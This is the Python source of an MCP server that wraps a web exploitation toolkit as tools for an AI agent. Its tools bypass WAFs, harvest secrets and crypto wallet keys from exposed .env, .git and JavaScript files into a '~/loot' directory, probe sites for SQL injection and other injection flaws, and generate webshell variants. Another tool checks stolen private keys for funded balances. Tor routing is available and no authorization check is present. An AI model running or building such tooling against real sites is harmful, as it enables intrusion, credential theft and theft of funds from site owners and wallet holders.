#!/usr/bin/env python3
"""
wexec-mcp.py — MCP server exposing the webexec toolkit as discrete tools.

Transport: stdio JSON-RPC 2.0 (protocol 2024-11-05), no external dependencies.
Every tool wraps a verified module from ~/.free-pi/agent/skills/webexec/.

Design rules enforced here:
  - output is always redacted (lib.webutil.redact) before leaving the process
  - secrets are stored to ~/loot/secrets (600) by the underlying modules
  - every response says explicitly what was proven vs not
  - long scans are capped so a single call cannot hang the client

Register (user level):
  pi mcp add webexec -- python3 ~/.free-pi/agent/skills/webexec/wexec-mcp.py
"""
from __future__ import annotations

import json
import os
import sys
import traceback

SKILL_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, SKILL_DIR)
sys.path.insert(0, os.path.dirname(SKILL_DIR))  # so `lib.webutil` resolves

from lib.webutil import (Client, Differ, Baseline, detect_waf, fp,  # noqa: E402
                         mutate_payload, neutralise, norm_url, redact,
                         save_raw, save_secret, evasion_headers)

PROTOCOL = "2024-11-05"

# --------------------------------------------------------------------------- #
# JSON-RPC plumbing
# --------------------------------------------------------------------------- #
def send(obj):
    sys.stdout.write(json.dumps(obj) + "\n")
    sys.stdout.flush()


def reply(rid, result):
    send({"jsonrpc": "2.0", "id": rid, "result": result})


def fail(rid, code, message):
    send({"jsonrpc": "2.0", "id": rid, "error": {"code": code, "message": message}})


def text_result(payload, is_error=False):
    body = payload if isinstance(payload, str) else json.dumps(payload, indent=2, default=str)
    return {"content": [{"type": "text", "text": redact(body)}], "isError": is_error}


def make_client(args):
    proxy = args.get("proxy")
    if args.get("tor"):
        proxy = proxy or "socks5h://127.0.0.1:9050"
    return Client(timeout=min(int(args.get("timeout", 15)), 60), proxy=proxy,
                  delay=float(args.get("delay", 0.0)))


# --------------------------------------------------------------------------- #
# tool implementations
# --------------------------------------------------------------------------- #
def t_fingerprint(a):
    import fpr as m
    base = norm_url(a["target"])
    c = make_client(a)
    root = c.get(base + "/")
    bl = Baseline(c, base)
    out = {"target": base, "root": {"status": root.status, "size": root.size,
                                    "ms": round(root.elapsed * 1000), "error": root.error},
           "waf": detect_waf(root),
           "headers": {h: root.header(h) for h in
                       ("server", "x-powered-by", "cf-ray", "via", "set-cookie")
                       if root.header(h)},
           "tech": m.tech_of(root.body, root.headers),
           "baseline": {"status": bl.status, "size_median": bl.size_median},
           "proven": "transport + WAF + tech only; nothing exploited here"}
    return out


def t_http(a):
    c = make_client(a)
    url = norm_url(a["url"]) if not a["url"].startswith(("http://", "https://")) else a["url"]
    method = a.get("method", "GET").upper()
    hdrs = a.get("headers") or {}
    if method == "GET":
        r = c.get(url, headers=hdrs)
    elif method == "POST":
        data = a.get("body")
        if isinstance(data, (dict, list)):
            r = c.post_json(url, data, headers=hdrs)
        else:
            r = c.post(url, data or "", headers=hdrs)
    else:
        r = c.req(url, method, a.get("body"), hdrs)
    shown = r.body[:int(a.get("max_chars", 20000))]
    return {"status": r.status, "size": r.size, "ms": round(r.elapsed * 1000),
            "via": r.via, "error": r.error, "waf": detect_waf(r),
            "headers": dict(list(r.headers.items())[:25]),
            "body": redact(shown), "truncated": r.size > len(shown)}


def t_waf_bypass(a):
    import wafbypass as m
    base = norm_url(a["target"])
    pl = a.get("payload", "' UNION SELECT 1,2,3-- -")
    results = []
    c = make_client(a)
    results.append(m.probe(c, base + "/", "direct"))
    if base.startswith("https://"):
        results.append(m.probe(make_client(a), base.replace("https://", "http://", 1) + "/", "http"))
    if a.get("headers", True):
        for h in evasion_headers():
            if h:
                results.append(m.probe(c, base + "/", "hdr:" + ",".join(h), h))
    if a.get("payload_mutation", True):
        import urllib.parse
        for lvl in (1, 2, 3, 4):
            results.append(m.probe(c, base + "/?wexec=" + urllib.parse.quote(mutate_payload(pl, lvl)),
                                   f"payload-L{lvl}"))
    ok = [t for t in results if not t["blocked"] and t["status"]]
    return {"target": base, "tests": results, "working_transports": [t["transport"] for t in ok],
            "recommendation": ("use " + ok[0]["transport"]) if ok else
            ("WAF blocks all direct transports — pivot to co-host on the same IP"
             if detect_waf(c.get(base + "/")) else "all transports blocked at network level")}


def t_expose(a):
    import expose as m
    r = m.run(a["target"], proxy=a.get("proxy"), tor=a.get("tor", False),
              dump=a.get("dump", False), timeout=min(int(a.get("timeout", 10)), 40),
              client=make_client(a))
    r["proven"] = (f"{r['summary']['hits']} content-validated hits "
                   f"(soft-404 rejected); secrets stored in ~/loot/secrets")
    return r


def t_git_dig(a):
    import gitdig as m
    out = a.get("out") or os.path.expanduser(
        "~/loot/raw/" + a["target"].replace("https://", "").replace("http://", "").replace("/", "_") + "_git")
    # reuse main() via argv is avoided: call subprocess-free path by invoking module main
    sys.argv = ["gitdig", a["target"], "--out", out,
                "--timeout", str(min(int(a.get("timeout", 15)), 40))]
    if a.get("proxy"):
        sys.argv += ["--proxy", a["proxy"]]
    if a.get("tor"):
        sys.argv += ["--tor"]
    import io
    from contextlib import redirect_stdout
    buf = io.StringIO()
    try:
        with redirect_stdout(buf):
            m.main()
        data = json.loads(buf.getvalue())
    except SystemExit:
        data = json.loads(buf.getvalue())
    except Exception as e:  # noqa: BLE001
        return {"error": f"{type(e).__name__}: {e}", "git_dir": out}
    data["proven"] = ("repository reconstructed" if data.get("exposed") else ".git not exposed")
    return data


def t_js_leak(a):
    import jsleak as m
    r = m.run(target=a.get("target"), text=a.get("text"), name=a.get("name", "inline.js"),
              max_bundles=min(int(a.get("max_bundles", 25)), 60),
              proxy=a.get("proxy"), tor=a.get("tor", False), client=make_client(a))
    r["proven"] = (f"{r['summary']['secrets']} pattern-matched candidates; "
                   f"wallet material stored to ~/loot/secrets — validate with wexec_keyhunt")
    return r


def t_inject(a):
    import inject as m
    r = m.run(a["target"], params=a.get("params"), crawl=a.get("crawl", False),
              types=a.get("types", "sqli,ssti,lfi,xss,redirect"),
              max_params=min(int(a.get("max_params", 12)), 40),
              proxy=a.get("proxy"), tor=a.get("tor", False),
              timeout=min(int(a.get("timeout", 15)), 30), client=make_client(a))
    r["proven"] = (f"{r['summary'].get('strong', 0)} STRONG differential findings; "
                   f"WEAK entries are leads only, never findings")
    return r


def t_differential(a):
    """Raw differential proof: compare two requests, return the measured delta."""
    c = make_client(a)
    d = Differ(c)
    ra = c.get(a["control_url"], headers=a.get("headers") or {})
    rb = c.get(a["payload_url"], headers=a.get("headers") or {})
    cmp_ = d.compare(ra, rb)
    return {"control": {"status": ra.status, "size": ra.size, "ms": round(ra.elapsed * 1000)},
            "payload": {"status": rb.status, "size": rb.size, "ms": round(rb.elapsed * 1000)},
            "delta": cmp_, "verdict": Differ.verdict(cmp_),
            "proven": "measurement only"}


def t_panel(a):
    import panel as m
    c = make_client(a)
    base = norm_url(a["target"])
    bl = Baseline(c, base)
    paths = m.DEFAULT_PATHS
    if a.get("wordlist"):
        with open(a["wordlist"]) as f:
            paths = [l.strip() for l in f if l.strip() and not l.startswith("#")]
    limit = min(int(a.get("limit", 400)), 2000)
    hits = []
    for p in paths[:limit]:
        try:
            h = m.probe(c, base, bl, p)
        except Exception:
            h = None
        if h:
            hits.append(h)
    hits.sort(key=lambda h: (["critical", "medium", "low", "info"].index(h["severity"]), h["path"]))
    return {"target": base, "tested": len(paths[:limit]), "hits": hits,
            "summary": {"hits": len(hits),
                        "critical": sum(1 for h in hits if h["severity"] == "critical"),
                        "has_login": any("login_form" in h["tags"] for h in hits)},
            "proven": "baselined probes; soft-404 suppressed"}


def t_subdomain(a):
    import subprocess
    dom = a["target"].replace("https://", "").replace("http://", "").split("/")[0]
    out = {"domain": dom, "crtsh": [], "subfinder": [], "resolved": {}}
    try:
        import urllib.request
        u = f"https://crt.sh/?q=%25.{dom}&output=json"
        with urllib.request.urlopen(urllib.request.Request(
                u, headers={"User-Agent": "Mozilla/5.0"}), timeout=25) as r:
            data = json.loads(r.read())
        names = set()
        for e in data:
            for n in str(e.get("name_value", "")).split("\n"):
                n = n.strip().lower().lstrip("*.")
                if n.endswith(dom):
                    names.add(n)
        out["crtsh"] = sorted(names)[:400]
    except Exception as e:  # noqa: BLE001
        out["crtsh_error"] = str(e)
    if a.get("subfinder", True):
        try:
            p = subprocess.run(["subfinder", "-d", dom, "-silent"], capture_output=True,
                               text=True, timeout=min(int(a.get("timeout", 60)), 120))
            out["subfinder"] = [l.strip() for l in p.stdout.splitlines() if l.strip()][:400]
        except Exception as e:  # noqa: BLE001
            out["subfinder_error"] = str(e)
    if a.get("resolve", True):
        import socket
        for h in sorted(set(out["crtsh"]) | set(out["subfinder"]))[:80]:
            try:
                out["resolved"][h] = sorted({ai[4][0] for ai in socket.getaddrinfo(h, None)})
            except Exception:
                out["resolved"][h] = []
    allh = sorted(set(out["crtsh"]) | set(out["subfinder"]))
    out["summary"] = {"unique": len(allh),
                      "hosts": allh[:200]}
    out["proven"] = "passive enumeration (certificate transparency + subfinder)"
    return out


def t_keyhunt(a):
    import keyhunt as m
    chains = [c.strip() for c in a.get("chains", "ethereum").split(",") if c.strip() in m.RPCS]
    results = []
    if a.get("hex"):
        results.append(m.check_one("hex", a["hex"], chains, "inline"))
    if a.get("mnemonic"):
        results.append(m.check_one("mnemonic", a["mnemonic"], chains, "inline"))
    if a.get("dir"):
        seen = set()
        for root, _, files in os.walk(os.path.expanduser(a["dir"])):
            for fn in files:
                p = os.path.join(root, fn)
                try:
                    t = open(p, errors="ignore").read()
                except Exception:
                    continue
                import re as _re
                for mt in _re.finditer(r"(?i)(0x)?([a-f0-9]{64})", t):
                    key = (mt.group(1) or "") + mt.group(2)
                    if fp(key) in seen:
                        continue
                    seen.add(fp(key))
                    results.append(m.check_one("hex", key, chains, p))
    if a.get("text"):
        import re as _re
        for mt in _re.finditer(r"(?i)(0x)?([a-f0-9]{64})", a["text"]):
            results.append(m.check_one("hex", (mt.group(1) or "") + mt.group(2), chains, "text"))
    funded = [r for r in results if r.get("status") == "FUNDED"]
    return {"checked": len(results), "funded": len(funded), "chains": chains,
            "results": results,
            "proven": ("balances read from live public RPC; signing/transfer never performed. "
                       "EMPTY/DUST is not a finding.")}


def t_shellgen(a):
    import shellgen as m
    outdir = os.path.expanduser(a.get("out", "/tmp/shells"))
    sys.argv = ["shellgen", "--mode", a.get("mode", "all"), "--out", outdir]
    if a.get("url"):
        sys.argv += ["--url", a["url"], "--param", a.get("param", "file")]
    import io
    from contextlib import redirect_stdout
    buf = io.StringIO()
    with redirect_stdout(buf):
        try:
            m.main()
        except SystemExit:
            pass
    import subprocess
    lint = {}
    for f in sorted(os.listdir(outdir)):
        if f.endswith(".php"):
            p = os.path.join(outdir, f)
            r = subprocess.run(["php", "-l", p], capture_output=True, text=True)
            lint[f] = "ok" if r.returncode == 0 else r.stdout.strip()[:120]
    return {"out_dir": outdir, "files": sorted(os.listdir(outdir)),
            "php_lint": lint, "output": buf.getvalue().splitlines()[:60],
            "proven": "every .php variant syntax-checked with `php -l`"}


def t_payload(a):
    kind = a["kind"]
    path = os.path.join(SKILL_DIR, "payloads", f"{kind}.txt")
    if not os.path.exists(path):
        avail = sorted(x[:-4] for x in os.listdir(os.path.join(SKILL_DIR, "payloads")))
        return {"error": f"unknown kind {kind}", "available": avail}
    with open(path) as f:
        items = [l.rstrip("\n") for l in f if l.strip() and not l.startswith("#")]
    level = int(a.get("mutate_level", 0))
    if level:
        items = [mutate_payload(i, level) for i in items]
    return {"kind": kind, "count": len(items), "payloads": items}


def t_redact(a):
    return {"redacted": redact(a["text"])}


# --------------------------------------------------------------------------- #
# tool schemas
# --------------------------------------------------------------------------- #
T = []


def tool(name, desc, props, required=()):
    T.append({"name": name, "description": desc,
              "inputSchema": {"type": "object", "properties": props,
                              "required": list(required)}})


PROXY = {"proxy": {"type": "string", "description": "HTTP proxy URL, e.g. http://user:pass@host:port"}}
TORH = {"tor": {"type": "boolean", "description": "Route through Tor at socks5h://127.0.0.1:9050"}}
TO = {"timeout": {"type": "integer", "description": "Per-request timeout in seconds (max 60)"}}
TARGET = {"target": {"type": "string", "description": "Target domain or URL"}}

tool("wexec_fingerprint", "Fingerprint a web target: transport status, WAF, tech stack, soft-404 baseline. Always run first.",
     {**TARGET, **PROXY, **TORH, **TO}, ["target"])
tool("wexec_http", "Send one raw HTTP request and return status, headers and redacted body. Use for manual probing.",
     {"url": {"type": "string"}, "method": {"type": "string"},
      "headers": {"type": "object"}, "body": {"description": "string or JSON object"},
      "max_chars": {"type": "integer"}, **PROXY, **TORH, **TO}, ["url"])
tool("wexec_waf_bypass", "Diagnose why requests are blocked and report which transport gets through (HTTP vs HTTPS, header permutation, payload mutation).",
     {**TARGET, "payload": {"type": "string"}, **PROXY, **TORH, **TO}, ["target"])
tool("wexec_expose", "Sweep sensitive paths (.env, .git, backups, keys, configs) with content validation and soft-404 rejection. Secrets go to ~/loot/secrets.",
     {**TARGET, "dump": {"type": "boolean", "description": "Save full bodies to ~/loot/raw"},
      **PROXY, **TORH, **TO}, ["target"])
tool("wexec_git_dig", "Reconstruct an exposed .git repository and hunt secrets across ALL commits (no external deps).",
     {**TARGET, "out": {"type": "string"}, **PROXY, **TORH, **TO}, ["target"])
tool("wexec_js_leak", "Harvest secrets, wallet material and API endpoints from a site's JS bundles and inline scripts.",
     {"target": {"type": "string"}, "text": {"type": "string", "description": "Scan this JS text instead of a URL"},
      "name": {"type": "string"}, "max_bundles": {"type": "integer"}, **PROXY, **TORH, **TO})
tool("wexec_inject", "Differential injection prober: SQLi (error/boolean/time), SSTI, LFI, XSS, open redirect. STRONG only counts.",
     {**TARGET, "params": {"type": "array", "items": {"type": "string"}},
      "crawl": {"type": "boolean"}, "types": {"type": "string"},
      "max_params": {"type": "integer"}, **PROXY, **TORH, **TO}, ["target"])
tool("wexec_differential", "Prove a difference between a control request and a payload request (status/size/timing/similarity).",
     {"control_url": {"type": "string"}, "payload_url": {"type": "string"},
      "headers": {"type": "object"}, **PROXY, **TORH, **TO}, ["control_url", "payload_url"])
tool("wexec_panel", "Discover admin panels, API endpoints and debug surfaces with baselined probes.",
     {**TARGET, "wordlist": {"type": "string"}, "limit": {"type": "integer"}, **PROXY, **TORH, **TO}, ["target"])
tool("wexec_subdomain", "Enumerate subdomains via crt.sh and subfinder, then resolve to IPs to find origin servers.",
     {**TARGET, "subfinder": {"type": "boolean"}, "resolve": {"type": "boolean"}, **TO}, ["target"])
tool("wexec_keyhunt", "Derive addresses from leaked private keys/mnemonics and read REAL on-chain balances (read-only, never signs).",
     {"hex": {"type": "string"}, "mnemonic": {"type": "string"},
      "dir": {"type": "string", "description": "Directory of harvested secrets, e.g. ~/loot/secrets"},
      "text": {"type": "string"}, "chains": {"type": "string", "description": "comma list: ethereum,bsc,polygon,arbitrum,base"}},
     [])
tool("wexec_shellgen", "Generate webshell variants (40+) plus the upload bypass matrix; lints every PHP file.",
     {"mode": {"type": "string", "enum": ["php", "asp", "jsp", "node", "all"]},
      "out": {"type": "string"}, "url": {"type": "string"}, "param": {"type": "string"}})
tool("wexec_payload", "Return a payload dictionary (sqli, lfi, ssti, xss, ssrf, open-redirect, secret-paths, traversal-params, header-inject), optionally obfuscated.",
     {"kind": {"type": "string"}, "mutate_level": {"type": "integer"}}, ["kind"])
tool("wexec_redact", "Scrub secret-looking strings from text before it is shared or logged.",
     {"text": {"type": "string"}}, ["text"])

HANDLERS = {
    "wexec_fingerprint": t_fingerprint,
    "wexec_http": t_http,
    "wexec_waf_bypass": t_waf_bypass,
    "wexec_expose": t_expose,
    "wexec_git_dig": t_git_dig,
    "wexec_js_leak": t_js_leak,
    "wexec_inject": t_inject,
    "wexec_differential": t_differential,
    "wexec_panel": t_panel,
    "wexec_subdomain": t_subdomain,
    "wexec_keyhunt": t_keyhunt,
    "wexec_shellgen": t_shellgen,
    "wexec_payload": t_payload,
    "wexec_redact": t_redact,
}

INSTRUCTIONS = (
    "webexec toolkit: web exploitation with proof requirements. "
    "Start with wexec_fingerprint. A finding is only STRONG when differentially proven. "
    "Secrets are never returned in plaintext; they are stored in ~/loot/secrets (600) "
    "and referenced by fingerprint. wexec_keyhunt reads balances only and never signs."
)


# --------------------------------------------------------------------------- #
def handle(msg):
    rid = msg.get("id")
    method = msg.get("method")
    params = msg.get("params") or {}
    if rid is None:
        return
    if method == "initialize":
        reply(rid, {"protocolVersion": PROTOCOL, "capabilities": {"tools": {}},
                    "serverInfo": {"name": "webexec", "version": "1.0.0"},
                    "instructions": INSTRUCTIONS})
        return
    if method in ("notifications/initialized", "notifications/cancelled"):
        return
    if method == "ping":
        reply(rid, {})
        return
    if method == "tools/list":
        reply(rid, {"tools": T})
        return
    if method == "tools/call":
        name = params.get("name")
        args = params.get("arguments") or {}
        fn = HANDLERS.get(name)
        if not fn:
            reply(rid, text_result({"error": f"unknown tool {name}"}, True))
            return
        try:
            res = fn(args)
            reply(rid, text_result(res))
        except Exception as e:  # noqa: BLE001
            reply(rid, text_result({"error": f"{type(e).__name__}: {e}",
                                    "trace": traceback.format_exc()[-1200:]}, True))
        return
    if method == "resources/list":
        reply(rid, {"resources": []})
        return
    if method == "prompts/list":
        reply(rid, {"prompts": []})
        return
    fail(rid, -32601, f"Method not found: {method}")


def main():
    buf = ""
    for chunk in iter(lambda: sys.stdin.readline(), ""):
        buf += chunk
        while "\n" in buf:
            line, buf = buf.split("\n", 1)
            line = line.strip()
            if not line:
                continue
            try:
                msg = json.loads(line)
            except Exception:
                continue
            for m in (msg if isinstance(msg, list) else [msg]):
                try:
                    handle(m)
                except Exception:  # noqa: BLE001
                    sys.stderr.write(traceback.format_exc())


if __name__ == "__main__":
    main()
